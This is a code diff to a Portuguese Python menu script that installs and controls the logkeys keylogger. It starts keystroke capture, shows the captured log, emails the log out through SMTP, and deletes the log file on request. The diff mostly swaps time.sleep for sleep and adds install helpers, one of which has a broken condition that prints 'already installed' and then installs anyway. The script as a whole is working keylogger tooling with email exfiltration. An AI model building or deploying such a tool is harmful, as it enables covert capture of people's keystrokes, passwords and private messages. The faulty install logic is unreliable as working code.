@@ -4,10 +4,12 @@
 #Versão: 1.0.2
 
 import os
-import time
+from time import sleep
 import sys, traceback
 import getpass
 import platform
+
+exit_msg = "\n[++] Até logo!\n"
 
 def intro():
     if not os.geteuid() == 0:
@@ -19,34 +21,41 @@ def intro():
 └════════════════════════════┘\033[1;m""")
 intro()
 
+def instalar01():
+    print("\n[+] Instalando o logkeys. Aguarde!")
+    os.system("apt-get update > /dev/null")
+    os.system("apt-get install logkeys -y > /dev/null")
+    sleep(2)  
+    print("\n[+] Ok!")
+def instalar02():
+    print("\n[+] Instalando o logkeys. Aguarde!")
+    os.system("chmod +x logkeysinstall.sh && ./logkeysinstall.sh")
+    sleep(2)
+    print("\n[+] Ok!")
+
 def verificar():
-    print("[++] Verificando dependencias:")
-    time.sleep(2)
-    if os.path.exists("/etc/default/logkeys") == True:
+    print("[++] Verificando dependencias:\n")
+    dist = (platform.dist()[1])
+    print("[!] Versão do seu sistema: ", dist)
+    sleep(2)
+    if os.path.exists("/usr/bin/logkeys") or os.path.exists("/etc/default/logkeys") == True:
         print("\n[!] Logkeys já está instalado!")
-        time.sleep(2)
+        sleep(2)
+    elif dist ==  "18.04" and "kali*":
+        print("\n[!] Logkeys já está instalado!")
+        instalar02()
     else:
-        print("\n[+] Instalando o logkeys. Aguarde!")
-        time.sleep(2)
-        dist = (platform.dist()[1])
-        if dist == "18.04" or "kali*":
-            os.system("chmod +x logkeysinstall.sh && ./logkeysinstall.sh")
-            print("\n[+] Ok!")
-            time.sleep(2)
-        else:
-            os.system("apt-get update > /dev/null")
-            os.system("apt-get install logkeys -y > /dev/null")
-            print("\n[+] Ok!")
-            time.sleep(1)
+        instalar01()
+                 
     if os.path.exists("/usr/share/applications/gnome-terminal.desktop") == True:
         print("\n[!] Gnome-terminal já está instalado!")
-        time.sleep(2)
+        sleep(2)
     else:
         print("\n[+] Instalando o gnome-terminal. Aguarde!")
-        time.sleep(2)
+        sleep(2)
         os.system("apt-get install gnome-terminal -y  > /dev/null")
         print("\n[+] Ok")
-        time.sleep(1)
+        sleep(1)
 
 def enviar():
     import smtplib
@@ -70,11 +79,11 @@ def enviar():
         smtp.sendmail(user, email, msg)
         smtp.quit()
         print("""\033[1;36m\n [++] Email enviado\033[1;m""")
-        time.sleep(2)
+        sleep(2)
 
     except smtplib.SMTPRecipientsRefused:
         print("""\033[1;91m\n [!] Erro ao enviar, email inválido\n\033[1;m""")
-        time.sleep(2)
+        sleep(2)
         enviar()
 
 def sistema():
@@ -99,23 +108,23 @@ def sistema():
         else:
             os.system("wget https://raw.githubusercontent.com/kernc/logkeys/master/keymaps/pt_BR.map > /dev/null")
             os.system("logkeys -s -m pt_BR.map")
-        time.sleep(2)
+        sleep(2)
         print("\n[+] Ok")
-        time.sleep(2)
+        sleep(2)
         os.system("clear")
         sistema()
 
     elif opcao == "2":
         print("\n[+] Abrindo tela de logs")
         os.system("gnome-terminal -x tail -f /var/log/logkeys.log")
-        time.sleep(2)
+        sleep(2)
         os.system("clear")
         sistema()
 
     elif opcao == "3":
         print("\n[+] Enviar log por e-mail")
         print("[++] Obs: Permita utilizar app menos seguro na conta do gmail que você for utilizar como remetente.")
-        time.sleep(3)
+        sleep(3)
         enviar()
         os.system("clear")
         sistema()
@@ -123,33 +132,40 @@ def sistema():
     elif opcao == "4":
         print("\n[+] Parando logkeys")
         os.system("logkeys -k")
-        time.sleep(2)
+        sleep(2)
         os.system("clear")
         sistema()
 
     elif opcao == "5":
         print("\n[+] Apagando arquivos de logs")
-        time.sleep(2)
+        sleep(2)
         if os.path.exists("/var/log/logkeys.log") == True:
             os.system("rm -rf /var/log/logkeys.log")
             print("\n[++] Arquivo apagado!")
-            time.sleep(2)
+            sleep(2)
         else:
             print("\n[++] Arquivos não existe ou já foi apagado!")
-            time.sleep(2)
+            sleep(2)
         os.system("clear")
         sistema()
 
     elif opcao == "6":
         print("\n[+] Saindo do sistema")
-        time.sleep(2)
+        sleep(2)
         sys.exit()
     else:
         opcao == ""
         print("""\033[1;91m\n[!] Opção inválida. Favor selecionar uma das opões do menu.\n\033[1;m""")
-        time.sleep(2)
+        sleep(2)
         os.system("clear")
         sistema()
 
-verificar()
-sistema()
+try:
+    verificar()
+    sistema()
+except KeyboardInterrupt:
+	print ("\n" + exit_msg)
+	sleep(1)
+except Exception:
+	traceback.print_exc(file=sys.stdout)
+sys.exit(0)
